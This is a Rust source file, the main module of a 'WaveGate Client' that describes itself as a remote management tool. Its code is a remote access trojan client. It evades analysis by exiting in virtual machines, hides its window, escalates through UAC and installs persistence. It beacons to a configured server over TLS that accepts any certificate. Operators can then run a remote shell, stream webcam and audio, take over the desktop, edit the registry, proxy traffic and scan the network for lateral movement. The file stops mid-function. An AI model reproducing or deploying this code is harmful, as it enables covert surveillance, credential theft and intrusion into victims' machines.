// Hide console window on Windows
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

//! WaveGate Client
//!
//! Lightweight client for remote management.

use std::fs::File;
use std::net::{IpAddr, SocketAddr};
use std::sync::Arc;
use std::time::Duration;

use fs4::fs_std::FileExt;
use tokio::io::{ReadHalf, WriteHalf};
use tokio::net::{TcpStream, UdpSocket};
use tokio::sync::mpsc;
use tokio_rustls::client::TlsStream;
use tokio_rustls::TlsConnector;
use rustls::ClientConfig as RustlsConfig;
use rustls::pki_types::ServerName;
use once_cell::sync::OnceCell;
use parking_lot::Mutex;
use serde::Deserialize;

use wavegate_shared::*;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

mod ad;
mod chat;
mod clipboard;
mod commands;
mod config;
mod credentials;
mod dns;
mod dnscache;
mod dxgi;
mod filemanager;
mod kerberos;
mod lateral;
mod local_security;
mod media;
mod processmanager;
mod proxy;
mod registry;
mod remotedesktop;
mod remotedesktop_h264;
mod h264_encoder;
mod services;
mod shell;
mod startupmanager;
mod taskscheduler;
mod tcpconnections;
mod token;
mod uac;
mod vmcheck;
mod websocket;
mod wmi;
mod startup;

use config::CONFIG;
use shell::ShellSession;

/// Geolocation response from ip-api.com
#[derive(Debug, Deserialize)]
struct GeoResponse {
    country: Option<String>,
}

/// Cached geolocation data (set once at startup)
static CACHED_COUNTRY: OnceCell<Option<String>> = OnceCell::new();

/// Persistent system info object for accurate CPU readings
static SYSTEM_INFO: OnceCell<Mutex<sysinfo::System>> = OnceCell::new();

/// Active shell session (only one at a time)
static ACTIVE_SHELL: OnceCell<Mutex<Option<ShellSession>>> = OnceCell::new();

/// Active media stream sender (for forwarding frames to server)
static MEDIA_FRAME_TX: OnceCell<Mutex<Option<mpsc::UnboundedSender<BinaryMediaFrame>>>> = OnceCell::new();

/// Active remote desktop stream sender (for forwarding frames to server)
static RD_FRAME_TX: OnceCell<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>> = OnceCell::new();

/// Active H.264 remote desktop stream sender
static RD_H264_FRAME_TX: OnceCell<Mutex<Option<mpsc::UnboundedSender<remotedesktop_h264::H264Frame>>>> = OnceCell::new();

/// Proxy manager (for SOCKS5 reverse proxy)
static PROXY_MANAGER: OnceCell<Mutex<Option<proxy::ProxyManager>>> = OnceCell::new();

#[tokio::main]
async fn main() {
    // VM detection - exit if running in a virtual machine
    if !vmcheck::check_environment() {
        return;
    }

    // Ensure running from standard install location first
    if !startup::ensure_installed_location() {
        // Re-launched from install location, exit this instance
        return;
    }

    // Check elevation (after relocation so installed copy gets elevated)
    if !startup::check_elevation() {
        // Re-launched with UAC, exit this instance
        return;
    }

    // Apply run delay if configured
    if CONFIG.run_delay_secs > 0 {
        tokio::time::sleep(Duration::from_secs(CONFIG.run_delay_secs as u64)).await;
    }

    // Acquire single-instance lock using configured mutex name
    // Retry after 5 seconds to support restart scenarios where old instance is exiting
    let lock_filename = format!("{}.lock", CONFIG.mutex_name);
    let lock_path = std::env::temp_dir().join(&lock_filename);
    let lock_file = match File::create(&lock_path) {
        Ok(f) => f,
        Err(_) => return,
    };

    if lock_file.try_lock_exclusive().is_err() {
        tokio::time::sleep(Duration::from_secs(5)).await;
        if lock_file.try_lock_exclusive().is_err() {
            return;
        }
    }

    // Check uninstall triggers before doing anything else
    if startup::check_uninstall_triggers() {
        startup::perform_uninstall();
        return;
    }

    // Show disclosure dialog if enabled (exit if user declines)
    if !startup::show_disclosure_dialog() {
        return;
    }

    // Install persistence if configured
    startup::install_persistence();

    // Enable prevent sleep if configured
    startup::enable_prevent_sleep();

    // Get persistent UID (based on machine GUID + build ID)
    let uid = get_persistent_uid();

    // Fetch geolocation once at startup
    let country = fetch_geolocation().await;
    let _ = CACHED_COUNTRY.set(country);

    // Apply connect delay if configured
    if CONFIG.connect_delay_secs > 0 {
        tokio::time::sleep(Duration::from_secs(CONFIG.connect_delay_secs as u64)).await;
    }

    loop {
        let _ = connect_and_run(&uid).await;

        // Clean up all active sessions on disconnect to prevent stale state
        cleanup_on_disconnect();

        // Check NoContact uninstall trigger
        if startup::check_no_contact_trigger() {
            startup::perform_uninstall();
            return;
        }

        tokio::time::sleep(Duration::from_secs(CONFIG.restart_delay_secs as u64)).await;
    }

    // Lock is held until program exits
}

/// Clean up all active sessions on disconnect
fn cleanup_on_disconnect() {
    // Close chat session
    let _ = chat::close_chat();

    // Close shell session
    if let Some(session) = get_shell_mutex().lock().take() {
        session.close();
    }

    // Stop media stream
    let _ = media::stop_media_stream();
    if let Some(mutex) = MEDIA_FRAME_TX.get() {
        *mutex.lock() = None;
    }

    // Stop remote desktop stream
    let _ = remotedesktop::stop_remote_desktop();
    if let Some(mutex) = RD_FRAME_TX.get() {
        *mutex.lock() = None;
    }

    // Clear proxy manager
    if let Some(mutex) = PROXY_MANAGER.get() {
        *mutex.lock() = None;
    }
}

async fn fetch_geolocation() -> Option<String> {
    tokio::task::spawn_blocking(|| {
        let resp = ureq::get("http://ip-api.com/json/")
            .timeout(std::time::Duration::from_secs(10))
            .call()
            .ok()?;
        let geo: GeoResponse = resp.into_json().ok()?;
        geo.country
    })
    .await
    .ok()?
}

async fn connect_and_run(uid: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Create TLS config that accepts any certificate (for self-signed)
    let tls_config = RustlsConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(AcceptAnyCert))
        .with_no_client_auth();

    let connector = TlsConnector::from(Arc::new(tls_config));

    // Try primary host first, then backup if configured
    let hosts: Vec<&str> = std::iter::once(CONFIG.primary_host.as_str())
        .chain(CONFIG.backup_host.as_deref())
        .collect();

    let mut stream = None;
    let mut connected_host = "";

    for host in &hosts {
        // Check if proxy is configured
        if let Some(ref proxy) = CONFIG.proxy {
            // Connect through proxy
            match connect_via_proxy(proxy, host, CONFIG.port).await {
                Ok(s) => {
                    stream = Some(s);
                    connected_host = host;
                    break;
                }
                Err(_) => continue,
            }
        } else {
            // Direct connection
            let ip = match resolve_host(host).await {
                Some(ip) => ip,
                None => continue,
            };

            match TcpStream::connect(SocketAddr::new(ip, CONFIG.port)).await {
                Ok(s) => {
                    stream = Some(s);
                    connected_host = host;
                    break;
                }
                Err(_) => continue,
            }
        }
    }

    let stream = stream.ok_or("Failed to connect to any host")?;

    // Upgrade to TLS - use custom SNI if configured, otherwise use actual hostname
    let sni_host = CONFIG.sni_hostname.as_deref().unwrap_or(connected_host);
    let server_name = ServerName::try_from(sni_host.to_string())?;
    let mut tls_stream = connector.connect(server_name, stream).await?;

    // WebSocket handshake if configured
    if CONFIG.websocket_mode {
        let ws_path = CONFIG.websocket_path.as_deref().unwrap_or("/ws");
        let ws_host = CONFIG.sni_hostname.as_deref().unwrap_or(connected_host);
        websocket::client_handshake(&mut tls_stream, ws_host, ws_path).await
            .map_err(|e| format!("WebSocket handshake failed: {}", e))?;
    }

    // Split stream for reading and writing
    let (reader, writer) = tokio::io::split(tls_stream);

    // Send registration
    let system_info = gather_system_info();

    let register_msg = RegisterMessage {
        protocol_version: PROTOCOL_VERSION,
        uid: uid.to_string(),
        build_id: CONFIG.build_id.clone(),
        system_info,
    };

    // Create channel for sending messages
    // Large buffer for streaming - prevents backpressure from blocking capture
    let (tx, rx) = mpsc::channel::<(ClientMessageType, Vec<u8>)>(512);

    // Spawn writer task (with WebSocket mode flag)
    let writer_handle = tokio::spawn(writer_task(writer, rx, CONFIG.websocket_mode));

    // Send registration
    let payload = serde_json::to_vec(&register_msg)?;
    tx.send((ClientMessageType::Register, payload)).await?;

    // Run reader loop (with WebSocket mode flag)
    let result = reader_loop(reader, tx.clone(), CONFIG.websocket_mode).await;

    // Clean up
    drop(tx);
    let _ = writer_handle.await;

    result
}

async fn writer_task(
    mut writer: WriteHalf<TlsStream<TcpStream>>,
    mut rx: mpsc::Receiver<(ClientMessageType, Vec<u8>)>,
    websocket_mode: bool,
) {
    use tokio::io::AsyncWriteExt;

    let mut messages_since_flush = 0u32;
    let mut last_flush = std::time::Instant::now();

    while let Some((msg_type, payload)) = rx.recv().await {
        // Build the protocol message (length + type + payload)
        let total_len = 1 + payload.len() as u32;
        let mut msg = Vec::with_capacity(5 + payload.len());
        msg.extend_from_slice(&total_len.to_be_bytes());
        msg.push(msg_type as u8);
        msg.extend_from_slice(&payload);

        // Write using WebSocket framing or raw
        let write_result = if websocket_mode {
            websocket::write_frame(&mut writer, websocket::Opcode::Binary, &msg).await
        } else {
            writer.write_all(&msg).await.map_err(|e| e.into())
        };

        if write_result.is_err() {
            break;
        }

        messages_since_flush += 1;

        // Flush periodically: every 16 messages OR every 50ms, whichever comes first
        // This batches writes for streaming while keeping latency reasonable for control messages
        let should_flush = messages_since_flush >= 16 || last_flush.elapsed().as_millis() > 50;

        if should_flush {
            if writer.flush().await.is_err() {
                break;
            }
            messages_since_flush = 0;
            last_flush = std::time::Instant::now();
        }
    }
}

/// Read a server message, optionally from WebSocket frame
async fn read_server_message_ws(
    reader: &mut ReadHalf<TlsStream<TcpStream>>,
    websocket_mode: bool,
) -> Result<(ServerMessageType, Vec<u8>), ProtocolError> {
    if websocket_mode {
        // Read WebSocket frame, extract our protocol message from it
        let (_opcode, frame_data) = websocket::read_frame(reader).await
            .map_err(|e| ProtocolError::Io(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())))?;

        // Frame data contains our length-prefixed message
        if frame_data.len() < 5 {
            return Err(ProtocolError::Io(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "WebSocket frame too small",
            )));
        }

        let len = u32::from_be_bytes([frame_data[0], frame_data[1], frame_data[2], frame_data[3]]);
        let msg_type_byte = frame_data[4];
        let msg_type = ServerMessageType::try_from(msg_type_byte)?;
        let payload = frame_data[5..].to_vec();

        Ok((msg_type, payload))
    } else {
        // Use standard protocol read
        read_server_message(reader).await
    }
}

async fn reader_loop(
    mut reader: ReadHalf<TlsStream<TcpStream>>,
    tx: mpsc::Sender<(ClientMessageType, Vec<u8>)>,
    websocket_mode: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    // Create interval for polling chat events
    let mut chat_poll_interval = tokio::time::interval(Duration::from_millis(100));
    chat_poll_interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);

    loop {
        // Use select to either read a message or poll chat events
        tokio::select! {
            result = read_server_message_ws(&mut reader, websocket_mode) => {
                // Network read errors are fatal - reconnect
                let (msg_type, payload) = result?;

                // Handle message errors gracefully - don't disconnect on bad commands
                if let Err(e) = handle_server_message(msg_type, payload, &tx).await {
                    // Check if it's a deliberate disconnect
                    let err_str = e.to_string();
                    if err_str.contains("Disconnected by server") {
                        return Err(e);
                    }
                    // For other errors (bad JSON, etc), log internally but continue
                    // The connection is still valid, just this message was bad
                }
            }
            _ = chat_poll_interval.tick() => {
                // Check for chat events from the user
                if let Some(chat_data) = commands::poll_chat_event() {
                    // Send chat event to server as an unsolicited response
                    let response = CommandResponseMessage {
                        id: "chat-event".to_string(),
                        success: true,
                        data: chat_data,
                    };
                    if let Ok(payload) = serde_json::to_vec(&response) {
                        // Ignore send errors here - if channel is closed, main loop will detect
                        let _ = tx.send((ClientMessageType::CommandResponse, payload)).await;
                    }
                }
            }
        }
    }
}

async fn handle_server_message(
    msg_type: ServerMessageType,
    payload: Vec<u8>,
    tx: &mpsc::Sender<(ClientMessageType, Vec<u8>)>,
) -> Result<(), Box<dyn std::error::Error>> {
    // Update last contact time for NoContact trigger tracking
    startup::update_last_contact();

    match msg_type {
        ServerMessageType::Welcome => {
            // Ignore parse errors for welcome - not critical
            let _ = serde_json::from_slice::<WelcomeMessage>(&payload);
        }

        ServerMessageType::Ping => {
            // Ping/pong is critical for connection health
            let ping: PingMessage = serde_json::from_slice(&payload)?;

            let pong = PongMessage {
                timestamp: ping.timestamp,
                seq: ping.seq,
            };
            if let Ok(payload) = serde_json::to_vec(&pong) {
                let _ = tx.send((ClientMessageType::Pong, payload)).await;
            }
        }

        ServerMessageType::Command => {
            // Parse command - if this fails, we can't respond properly
            let cmd: CommandMessage = match serde_json::from_slice(&payload) {
                Ok(c) => c,
                Err(_) => return Ok(()), // Silently ignore malformed commands
            };

            // Handle one-shot commands that don't send responses
            match &cmd.command {
                CommandType::Disconnect => {
                    // Just exit - no response, no reconnect
                    std::process::exit(0);
                }
                CommandType::Reconnect => {
                    // Break the connection loop to trigger reconnect - no response
                    return Err("Reconnect requested".into());
                }
                CommandType::RestartClient => {
                    // Spawn new instance hidden, then exit - no response
                    if let Ok(exe_path) = std::env::current_exe() {
                        use std::os::windows::process::CommandExt;
                        const CREATE_NO_WINDOW: u32 = 0x08000000;
                        let _ = std::process::Command::new(&exe_path)
                            .creation_flags(CREATE_NO_WINDOW)
                            .spawn();
                        std::thread::sleep(std::time::Duration::from_millis(500));
                    }
                    std::process::exit(0);
                }
                _ => {}
            }

            // Execute command with panic protection
            let (success, data) = execute_command_safe(&cmd.command, tx).await;

            let response = CommandResponseMessage {
                id: cmd.id,
                success,
                data,
            };
            if let Ok(payload) = serde_json::to_vec(&response) {
                let _ = tx.send((ClientMessageType::CommandResponse, payload)).await;
            }
        }

        ServerMessageType::RequestInfo => {
            // Wrap system info gathering in panic protection
            let system_info = std::panic::catch_unwind(gather_system_info)
                .unwrap_or_else(|_| gather_minimal_system_info());

            let update = InfoUpdateMessage { system_info };
            if let Ok(payload) = serde_json::to_vec(&update) {
                let _ = tx.send((ClientMessageType::InfoUpdate, payload)).await;
            }
        }

        ServerMessageType::Disconnect => {
            return Err("Disconnected by server".into());
        }

        ServerMessageType::ProxyConnect => {
            if let Ok(msg) = serde_json::from_slice::<ProxyConnectMessage>(&payload) {
                let manager = {
                    let proxy_mutex = get_proxy_mutex();
                    let mut proxy = proxy_mutex.lock();
                    if proxy.is_none() {
                        *proxy = Some(proxy::ProxyManager::new(tx.clone()));
                    }
                    proxy.as_ref().cloned()
                };

                if let Some(manager) = manager {
                    tokio::spawn(async move {
                        manager.handle_connect(msg).await;
                    });
                }
            }
        }

        ServerMessageType::ProxyData => {
            if let Ok(msg) = serde_json::from_slice::<ProxyDataMessage>(&payload) {
                let manager = {
                    let proxy_mutex = get_proxy_mutex();
                    let proxy = proxy_mutex.lock();
                    proxy.as_ref().cloned()
                };

                if let Some(manager) = manager {
                    tokio::spawn(async move {
                        manager.handle_data(msg).await;
                    });
                }
            }
        }

        ServerMessageType::ProxyClose => {
            if let Ok(msg) = serde_json::from_slice::<ProxyCloseMessage>(&payload) {
                let proxy_mutex = get_proxy_mutex();
                let proxy = proxy_mutex.lock();
                if let Some(ref manager) = *proxy {
                    manager.handle_close(msg);
                }
            }
        }
    }
    Ok(())
}

/// Execute a command with panic protection
async fn execute_command_safe(
    command: &CommandType,
    tx: &mpsc::Sender<(ClientMessageType, Vec<u8>)>,
) -> (bool, CommandResponseData) {
    match command {
        CommandType::ShellStart => {
            handle_shell_start(tx.clone()).await
        }
        CommandType::ShellInput { data } => {
            handle_shell_input(data.clone()).await
        }
        CommandType::ShellClose => {
            handle_shell_close().await
        }
        CommandType::StartMediaStream { video_device, audio_device, fps, quality, resolution } => {
            handle_media_start(
                tx.clone(),
                video_device.clone(),
                audio_device.clone(),
                *fps,
                *quality,
                resolution.clone(),
            ).await
        }
        CommandType::StopMediaStream => {
            handle_media_stop().await
        }
        CommandType::RemoteDesktopStart { fps, quality, .. } => {
            handle_rd_start(tx.clone(), *fps, *quality).await
        }
        CommandType::RemoteDesktopStop => {
            handle_rd_stop().await
        }
        CommandType::RemoteDesktopMouseInput { x, y, action, scroll_delta } => {
            remotedesktop::send_mouse_input(*x, *y, action, *scroll_delta)
        }
        CommandType::RemoteDesktopKeyInput { vk_code, action } => {
            remotedesktop::send_key_input(*vk_code, action)
        }
        CommandType::RemoteDesktopSpecialKey { key } => {
            remotedesktop::send_special_key(key)
        }
        CommandType::RemoteDesktopH264Start { fps, bitrate_mbps, keyframe_interval_secs } => {
            handle_rd_h264_start(tx.clone(), *fps, *bitrate_mbps, *keyframe_interval_secs).await
        }
        CommandType::RemoteDesktopH264Stop => {
            handle_rd_h264_stop().await
        }
        CommandType::RegistryListKeys { path } => {
            registry::list_keys(path)
        }
        CommandType::RegistryListValues { path } => {
            registry::list_values(path)
        }
        CommandType::RegistryGetValue { path, name } => {
            registry::get_value(path, name)
        }
        CommandType::RegistrySetValue { path, name, value_type, data } => {
            registry::set_value(path, name, value_type, data)
        }
        CommandType::RegistryDeleteValue { path, name } => {
            registry::delete_value(path, name)
        }
        CommandType::RegistryCreateKey { path } => {
            registry::create_key(path)
        }
        CommandType::RegistryDeleteKey { path, recursive } => {
            registry::delete_key(path, *recursive)
        }
        CommandType::LateralScanNetwork { subnet, ports } => {
            handle_lateral_scan(tx.clone(), subnet.clone(), ports.clone()).await
        }
        _ => {
            // Execute other commands with panic protection
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                commands::execute_command(command)
            })).unwrap_or_else(|_| {
                (false, CommandResponseData::Error {
                    message: "Command execution failed (internal error)".to_string(),
                })
            })
        }
    }
}

/// Handle lateral network scan with progress updates
async fn handle_lateral_scan(
    tx: mpsc::Sender<(ClientMessageType, Vec<u8>)>,
    subnet: String,
    ports: Option<Vec<u16>>,
) -> (bool, CommandResponseData) {
    use std::sync::Arc;
    use parking_lot::Mutex as SyncMutex;

    // Shared state for progress
    let progress_state = Arc::new(SyncMutex::new((0u32, 0u32, false))); // (current, total, done)
    let progress_state_writer = progress_state.clone();
    let progress_state_reader = progress_state.clone();

    // Spawn task to forward progress updates
    let tx_clone = tx.clone();
    let progress_forwarder = tokio::spawn(async move {
        let mut last_sent = 0u32;
        loop {
            tokio::time::sleep(Duration::from_millis(200)).await;

            let (current, total, done) = *progress_state_reader.lock();

            if done {
                break;
            }

            // Only send if progress changed
            if current != last_sent && total > 0 {
                last_sent = current;
                let progress = CommandResponseMessage {
                    id: String::new(),
                    success: true,
                    data: CommandResponseData::LateralScanProgress {
                        scanned: current,
                        total
                    },
                };
                if let Ok(payload) = serde_json::to_vec(&progress) {
                    let _ = tx_clone.send((ClientMessageType::CommandResponse, payload)).await;
                }
            }
        }
    });

    // Run the scan in a blocking task
    let result = tokio::task::spawn_blocking(move || {
        std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            crate::lateral::scan_network_with_progress(&subnet, ports, move |current, total| {
                let mut state = progress_state_writer.lock();
                state.0 = current;
                state.1 = total;
            })
        }))
    }).await;

    // Mark as done and wait for forwarder
    progress_state.lock().2 = true;
    let _ = progress_forwarder.await;

    match result {
        Ok(Ok(result)) => result,
        Ok(Err(_)) => (false, CommandResponseData::Error {
            message: "Network scan failed (internal error)".to_string(),
        }),
        Err(_) => (false, CommandResponseData::Error {
            message: "Network scan task failed".to_string(),
        }),
    }
}

/// Minimal system info when full gather fails
fn gather_minimal_system_info() -> SystemInfo {
    SystemInfo {
        machine_name: hostname::get()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|_| "Unknown".to_string()),
        username: whoami::username(),
        account_type: "Unknown".to_string(),
        os: "Unknown".to_string(),
        arch: std::env::consts::ARCH.to_string(),
        uptime_secs: 0,
        active_window: None,
        cpu_percent: 0,
        ram_percent: 0,
        local_ips: Vec::new(),
        country: None,
        cpu_name: None,
        cpu_cores: None,
        gpu_name: None,
        gpu_vram: None,
        ram_total: None,
        motherboard: None,
        drives: Vec::new(),
    }
}

fn gather_system_info() -> SystemInfo {
    // Get or initialize the persistent System object
    let sys_mutex = SYSTEM_INFO.get_or_init(|| {
        let mut sys = sysinfo::System::new();
        sys.refresh_all();
        sys.refresh_cpu_usage();
        Mutex::new(sys)
    });

    let mut sys = sys_mutex.lock();

    // Refresh CPU and memory for current readings
    sys.refresh_cpu_usage();
    sys.refresh_memory();

    let machine_name = hostname::get()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|_| "Unknown".to_string());

    let username = whoami::username();

    let account_type = if is_elevated() { "Admin" } else { "User" };

    let os = format!("{} {}",
        sysinfo::System::name().unwrap_or_else(|| "Unknown".to_string()),
        sysinfo::System::os_version().unwrap_or_else(|| "".to_string())
    );

    let arch = std::env::consts::ARCH.to_string();

    let uptime_secs = sysinfo::System::uptime();

    let cpu_percent = sys.global_cpu_usage() as u8;

    let total_memory = sys.total_memory();
    let used_memory = sys.used_memory();
    let ram_percent = if total_memory > 0 {
        ((used_memory as f64 / total_memory as f64) * 100.0) as u8
    } else {
        0
    };

    let local_ips = get_local_ips();
    let active_window = get_active_window();
    let country = CACHED_COUNTRY.get().cloned().flatten();

    // Get CPU name from sysinfo
    let cpu_name = sys.cpus().first().map(|cpu| cpu.brand().to_string());
    let cpu_cores = Some(sys.cpus().len() as u32);
    let ram_total = Some(total_memory);

    // Get drives info using sysinfo
    let disks = sysinfo::Disks::new_with_refreshed_list();
    let drives: Vec<DriveInfo> = disks.iter().map(|disk| {
        DriveInfo {
            name: disk.mount_point().to_string_lossy().to_string(),
            total_bytes: disk.total_space(),
            free_bytes: disk.available_space(),
            fs_type: disk.file_system().to_string_lossy().to_string(),
        }
    }).collect();

    // Get GPU and motherboard info via WMI
    let (gpu_name, gpu_vram, motherboard) = get_wmi_hardware_info();

    SystemInfo {
        machine_name,
        username,
        account_type: account_type.to_string(),
        os,
        arch,
        uptime_secs,
        active_window,
        cpu_percent,
        ram_percent,
        local_ips,
        country,
        cpu_name,
        cpu_cores,
        gpu_name,
        gpu_vram,
        ram_total,
        motherboard,
        drives,
    }
}

/// Get GPU and motherboard info via WMI
fn get_wmi_hardware_info() -> (Option<String>, Option<u64>, Option<String>) {
    use ::wmi::{COMLibrary, WMIConnection};
    use serde::Deserialize;

    #[derive(Deserialize)]
    #[serde(rename_all = "PascalCase")]
    struct Win32VideoController {
        name: Option<String>,
        adapter_ram: Option<u64>,
    }

    #[derive(Deserialize)]
    #[serde(rename_all = "PascalCase")]
    struct Win32BaseBoard {
        manufacturer: Option<String>,
        product: Option<String>,
    }

    let com = match COMLibrary::new() {
        Ok(c) => c,
        Err(_) => return (None, None, None),
    };

    let wmi_con = match WMIConnection::new(com) {
        Ok(c) => c,
        Err(_) => return (None, None, None),
    };

    // Get GPU info
    let (gpu_name, gpu_vram) = match wmi_con.query::<Win32VideoController>() {
        Ok(results) => {
            if let Some(gpu) = results.into_iter().next() {
                (gpu.name, gpu.adapter_ram)
            } else {
                (None, None)
            }
        }
        Err(_) => (None, None),
    };

    // Get motherboard info
    let motherboard = match wmi_con.query::<Win32BaseBoard>() {
        Ok(results) => {
            if let Some(board) = results.into_iter().next() {
                match (board.manufacturer, board.product) {
                    (Some(mfr), Some(prod)) => Some(format!("{} {}", mfr, prod)),
                    (Some(mfr), None) => Some(mfr),
                    (None, Some(prod)) => Some(prod),
                    (None, None) => None,
                }
            } else {
                None
            }
        }
        Err(_) => None,
    };

    (gpu_name, gpu_vram, motherboard)
}

fn is_elevated() -> bool {
    // Simple check - try to read a protected location
    std::fs::metadata("C:\\Windows\\System32\\config").is_ok()
}

/// Get a persistent UID for this client.
/// Uses Windows MachineGuid combined with build ID to create a stable identifier.
fn get_persistent_uid() -> String {
    use winreg::enums::*;
    use winreg::RegKey;

    // Try to read Windows MachineGuid
    let machine_guid = RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey(r"SOFTWARE\Microsoft\Cryptography")
        .and_then(|key| key.get_value::<String, _>("MachineGuid"))
        .ok();

    match machine_guid {
        Some(guid) => {
            // Combine machine GUID with build ID to create unique per-deployment UID
            // Use a hash to keep it reasonably short
            let combined = format!("{}:{}", guid, CONFIG.build_id);
            let hash = simple_hash(&combined);
            format!("{:016x}", hash)
        }
        None => {
            // Fallback if we can't read MachineGuid
            random_uuid()
        }
    }
}

fn simple_hash(s: &str) -> u64 {
    // Simple FNV-1a hash
    let mut hash: u64 = 0xcbf29ce484222325;
    for byte in s.bytes() {
        hash ^= byte as u64;
        hash = hash.wrapping_mul(0x100000001b3);
    }
    hash
}

/// Generate a random UUID v4 string
fn random_uuid() -> String {
    let mut bytes = [0u8; 16];
    for b in &mut bytes {
        *b = fastrand::u8(..);
    }
    // Set version (4) and variant (RFC 4122)
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;
    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        bytes[0], bytes[1], bytes[2], bytes[3],
        bytes[4], bytes[5],
        bytes[6], bytes[7],
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]
    )
}

fn get_local_ips() -> Vec<String> {
    let mut ips = Vec::new();

    if let Ok(interfaces) = local_ip_address::list_afinet_netifas() {
        for (_, ip) in interfaces {
            if !ip.is_loopback() {
                ips.push(ip.to_string());
            }
        }
    }

    if ips.is_empty() {
        if let Ok(ip) = local_ip_address::local_ip() {
            ips.push(ip.to_string());
        }
    }

    ips
}

/// Get the title of the currently active/focused window
fn get_active_window() -> Option<String> {
    use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowTextW};

    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.0 == std::ptr::null_mut() {
            return None;
        }

        let mut buffer = [0u16; 512];
        let len = GetWindowTextW(hwnd, &mut buffer);
        if len == 0 {
            return None;
        }

        Some(String::from_utf16_lossy(&buffer[..len as usize]))
    }
}

// Custom certificate verifier that accepts any certificate
// This is necessary for self-signed certificates
#[derive(Debug)]
struct AcceptAnyCert;

impl rustls::client::danger::ServerCertVerifier for AcceptAnyCert {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
        ]
    }
}

// ============================================================================
// Custom DNS Resolution
// ============================================================================

/// Resolve a hostname to IP address using configured DNS servers
async fn resolve_host(hostname: &str) -> Option<IpAddr> {
    // If it's already an IP address, parse and return it
    if let Ok(ip) = hostname.parse::<IpAddr>() {
        return Some(ip);
    }

    match &CONFIG.dns_mode {
        DnsMode::System => {
            // Use system DNS via tokio's built-in resolution
            use tokio::net::lookup_host;
            match lookup_host(format!("{}:0", hostname)).await {
                Ok(mut addrs) => addrs.next().map(|a| a.ip()),
                Err(_) => None,
            }
        }
        DnsMode::Custom { primary, backup } => {
            // Try primary DNS server
            if let Some(ip) = dns_query(hostname, primary).await {
                return Some(ip);
            }
            // Try backup if configured
            if let Some(backup_dns) = backup {
                if let Some(ip) = dns_query(hostname, backup_dns).await {
                    return Some(ip);
                }
            }
            None
        }
    }
}

/// Perform a simple DNS A record query to a specific DNS server
async fn dns_query(hostname: &str, dns_server: &str) -> Option<IpAddr> {
    let dns_addr: SocketAddr = format!("{}:53", dns_server).parse().ok()?;

    // Build a simple DNS query packet for A record
    let query = build_dns_query(hostname)?;

    // Send UDP query
    let socket = UdpSocket::bind("0.0.0.0:0").await.ok()?;
    socket.connect(dns_addr).await.ok()?;

    // Set timeout
    let send_result = tokio::time::timeout(
        Duration::from_secs(3),
        socket.send(&query)
    ).await;

    if send_result.is_err() || send_result.unwrap().is_err() {
        return None;
    }

    let mut response = [0u8; 512];
    let recv_result = tokio::time::timeout(
        Duration::from_secs(3),
        socket.recv(&mut response)
    ).await;

    let len = match recv_result {
        Ok(Ok(len)) => len,
        _ => return None,
    };

    // Parse response for A record
    parse_dns_response(&response[..len])
}

/// Build a simple DNS query packet for A record
fn build_dns_query(hostname: &str) -> Option<Vec<u8>> {
    let mut packet = Vec::with_capacity(512);

    // Transaction ID (random)
    packet.extend_from_slice(&[0x12, 0x34]);
    // Flags: standard query, recursion desired
    packet.extend_from_slice(&[0x01, 0x00]);
    // Questions: 1
    packet.extend_from_slice(&[0x00, 0x01]);
    // Answer RRs: 0
    packet.extend_from_slice(&[0x00, 0x00]);
    // Authority RRs: 0
    packet.extend_from_slice(&[0x00, 0x00]);
    // Additional RRs: 0
    packet.extend_from_slice(&[0x00, 0x00]);

    // Query name (hostname in DNS format)
    for label in hostname.split('.') {
        if label.len() > 63 {
            return None;
        }
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0); // Null terminator

    // Type: A (1)
